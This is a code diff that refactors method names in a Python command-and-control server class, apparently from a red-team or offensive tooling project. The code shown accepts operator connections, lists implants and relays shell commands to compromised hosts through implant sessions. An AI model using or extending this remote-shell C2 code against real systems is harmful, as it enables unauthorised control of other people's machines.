@@ -37,14 +37,15 @@ class C2Server(object):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.bind((self.host, self.port))
-        threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console
+
+        threading.Thread(target=self._accept_client).start() #this is so we can listen and have execute commands from server console
 
     def serverMain(self):
         while self.shutdown == 0:
             pass
 
     # Turn message into a protobuf Message and ssend to client
-    def sendClient(self, message, client):
+    def _send_client(self, message, client):
         response = operatorpb_pb2.ServerCmdOutput(cmdOutput=message)
 
         message = operatorpb_pb2.Message(
@@ -54,7 +55,7 @@ class C2Server(object):
 
         client.send(message.SerializeToString())
 
-    def shell_session(self, session_id, client):
+    def _shell_session(self, session_id, client):
             conn, addr = self.implantlistener.sessions.get(session_id) 
             
             # send to client that new session is connected
@@ -77,7 +78,7 @@ class C2Server(object):
 
 
                     if server_cmd.cmd == b"exit":
-                       self.sendClient((f"Exiting session {addr}\n").encode("ascii"),client)
+                       self._send_client((f"Exiting session {addr}\n").encode("ascii"),client)
                        break 
 
                     output = mtls.session(conn, server_cmd.cmd)
@@ -85,12 +86,12 @@ class C2Server(object):
                     if not output:
                         break
 
-                    self.sendClient(output.decode("ascii"),client)
+                    self._send_client(output.decode("ascii"),client)
 
-    def executecommand(self, command, client):
+    def _execute_command(self, command, client):
         #command is an array of strings
         if len(command) < 1:
-            self.sendClient("Please enter a command", client)
+            self._send_client("Please enter a command", client)
             return
 
         elif command[0] == "sessions":
@@ -102,7 +103,7 @@ class C2Server(object):
                 return (b"Session doesn't exist")
 
             if len(command) == 2:
-                self.shell_session(command[1], client) 
+                self._shell_session(command[1], client) 
             else:
                 return(b"Usage: use <session>")
 
@@ -114,7 +115,7 @@ class C2Server(object):
         else:
             return(b"Unknown Command")
 
-    def listen(self):
+    def _accept_client(self):
         numberOfUsers = 5
         self.sock.listen(numberOfUsers)
         while True: #keep listening, start a new thread when a client connects
@@ -124,10 +125,10 @@ class C2Server(object):
             self.handler.brodcastImplants(client)
 
             print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
-            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
+            t = threading.Thread(target = self._listen_client,args = (client,address)).start()
             self.connections.append(address) 
 
-    def listenToClient(self, client, address):
+    def _listen_client(self, client, address):
         size = 1024
         while True:
             data = client.recv(size)
@@ -143,9 +144,9 @@ class C2Server(object):
                 logging.info("Command: " + commandStr)
 
                 if (commandStr != "exit"):
-                    response = self.executecommand(commandStr.split(), client)
+                    response = self._execute_command(commandStr.split(), client)
                     if response:
-                        self.sendClient(response, client)
+                        self._send_client(response, client)
                 else:
                     print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
                     client.close()
